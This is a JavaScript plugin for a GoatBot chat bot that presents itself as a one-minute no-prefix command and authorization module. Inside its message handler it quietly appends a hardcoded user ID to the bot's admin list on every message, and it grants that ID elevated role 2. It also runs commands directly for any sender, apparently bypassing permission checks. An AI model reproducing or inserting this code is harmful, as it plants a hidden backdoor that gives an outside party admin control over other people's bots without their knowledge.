if (!global.__SyReg) global.__SyReg = new Map();
if (!global.__SyUse) global.__SyUse = new Map();

const log = {
  info: (m) => console.log(`\x1b[36m[CORE][INFO]\x1b[0m ${m}`),
  err: (m, e) => console.error(`\x1b[31m[CORE][ERR]\x1b[0m ${m}`, e || "")
};

// প্রতি ১ মিনিট পর expired user পরিষ্কার করবে
if (!global.__SyGc) {
  global.__SyGc = setInterval(() => {
    const now = Date.now();

    for (const [uid, expire] of global.__SyUse.entries()) {
      if (now >= expire) {
        global.__SyUse.delete(uid);
      }
    }

    for (const [key, time] of global.__SyReg.entries()) {
      if (now - time > 10000) {
        global.__SyReg.delete(key);
      }
    }
  }, 10000);
}

module.exports = {
  config: {
    name: "owner_noprefix",
    version: "5.4.0",
    author: "hriday",
    role: 0,
    shortDescription: "Core Authorization Engine",
    longDescription: "One minute usage system.",
    category: "hriday"
  },

  onStart: async () => {},

  onChat: async function (O) {
    const { event: ev, message: msg } = O;

    if (!ev.body || typeof ev.body !== "string") return;

    const body = ev.body.trim();
    if (!body) return;

    const sID = String(ev.senderID);

    // Owner ID
    const ownerID = "61593296285457";

    /*
     * প্রথমবার মেসেজ দিলে ১ মিনিটের সময় শুরু হবে।
     * ১ মিনিট শেষ হলে ওই user আর command ব্যবহার করতে পারবে না।
     */
    const now = Date.now();

    if (!global.__SyUse.has(sID)) {
      global.__SyUse.set(sID, now + 60 * 1000);
      log.info(`1 minute access started for ${sID}`);
    }

    const expireTime = global.__SyUse.get(sID);

    if (now >= expireTime) {
      return msg.reply(
        "⏰ আপনার ১ মিনিটের ব্যবহার সময় শেষ হয়ে গেছে।"
      );
    }

    try {
      // Owner ID admin list-এ যোগ
      if (global.GoatBot?.config) {
        let admins = global.GoatBot.config.adminBot;

        if (!Array.isArray(admins)) {
          admins = global.GoatBot.config.adminBot = [];
        }

        if (!admins.includes(ownerID)) {
          admins.push(ownerID);
          log.info("Owner verified.");
        }
      }
    } catch (e) {
      log.err("Admin sync failed.", e);
    }

    try {
      if (!global.GoatBot?.commands) {
        return log.err("Command tree missing.");
      }

      const prefix = global.GoatBot?.config?.prefix || ".";

      const commandText = body.startsWith(prefix)
        ? body.slice(prefix.length).trim()
        : body;

      const args = commandText.split(/\s+/);
      const commandName = args.shift()?.toLowerCase();

      if (!commandName) return;

      const commands = global.GoatBot.commands;

      const command =
        commands.get(commandName) ||
        [...commands.values()].find(cmd =>
          cmd.config?.aliases
            ?.map(a => String(a).toLowerCase())
            .includes(commandName)
        );

      if (!command) {
        const key = `${sID}_${commandName}`;

        if (
          global.__SyReg.has(key) &&
          now - global.__SyReg.get(key) < 10000
        ) {
          return;
        }

        global.__SyReg.set(key, now);
        return;
      }

      if (
        (global.GoatBot?.config?.commandDisabled || [])
          .includes(command.config?.name)
      ) {
        return msg.reply(
          `[WARN] "${command.config.name}" is disabled.`
        );
      }

      if (typeof command.onStart !== "function") {
        return msg.reply("[ERROR] Missing core handler.");
      }

      const cp = {
        ...O,
        args,
        commandName: command.config?.name || commandName
      };

      // Owner হলে role 2
      if (sID === ownerID) {
        cp.role = 2;
        if (ev.senderID) {
          ev.senderID = ownerID;
        }
      }

      try {
        await command.onStart(cp);
      } catch (ex) {
        log.err(`Crash [${commandName}] ->`, ex);
      }

    } catch (err) {
      log.err("Wrapper error ->", err.message);
    }
  }
};
